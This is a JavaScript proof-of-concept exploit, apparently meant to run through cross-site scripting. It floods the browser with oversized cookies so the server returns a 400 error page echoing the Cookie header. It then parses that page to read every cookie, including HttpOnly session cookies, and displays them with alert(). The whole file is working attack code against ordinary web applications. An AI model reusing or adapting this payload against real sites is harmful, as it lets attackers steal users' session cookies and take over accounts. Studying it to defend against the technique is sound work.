// Most browsers limit cookies to 4k characters, so we need multiple\\r\
function setCookies (good) {\\r\
    // Construct string for cookie value\\r\
    var str = "";\\r\
    for (var i=0; i< 819; i++) {\\r\
        str += "x";\\r\
    }\\r\
    // Set cookies\\r\
    for (i = 0; i < 10; i++) {\\r\
        // Expire evil cookie\\r\
        if (good) {\\r\
            var cookie = "xss"+i+"=;expires="+new Date(+new Date()-1).toUTCString()+"; path=/;";\\r\
        }\\r\
        // Set evil cookie\\r\
        else {\\r\
            var cookie = "xss"+i+"="+str+";path=/";\\r\
        }\\r\
        document.cookie = cookie;\\r\
    }\\r\
}\\r\
\\r\
function makeRequest() {\\r\
    setCookies();\\r\
\\r\
    function parseCookies () {\\r\
        var cookie_dict = {};\\r\
        // Only react on 400 status\\r\
        if (xhr.readyState === 4 && xhr.status === 400) {\\r\
            // Replace newlines and match <pre> content\\r\
            var content = xhr.responseText.replace(/\\\\r|\\\
/g,\\\'\\\').match(/<pre>(.+)<\\\\/pre>/);\\r\
            if (content.length) {\\r\
                // Remove Cookie: prefix\\r\
                content = content[1].replace("Cookie: ", "");\\r\
                var cookies = content.replace(/xss\\\\d=x+;?/g, \\\'\\\').split(/;/g);\\r\
                // Add cookies to object\\r\
                for (var i=0; i<cookies.length; i++) {\\r\
                    var s_c = cookies[i].split(\\\'=\\\',2);\\r\
                    cookie_dict[s_c[0]] = s_c[1];\\r\
                }\\r\
            }\\r\
            // Unset malicious cookies\\r\
            setCookies(true);\\r\
            alert(JSON.stringify(cookie_dict));\\r\
        }\\r\
    }\\r\
    // Make XHR request\\r\
    var xhr = new XMLHttpRequest();\\r\
    xhr.onreadystatechange = parseCookies;\\r\
    xhr.open("GET", "/", true);\\r\
    xhr.send(null);\\r\
}\\r\
\\r\
makeRequest();\
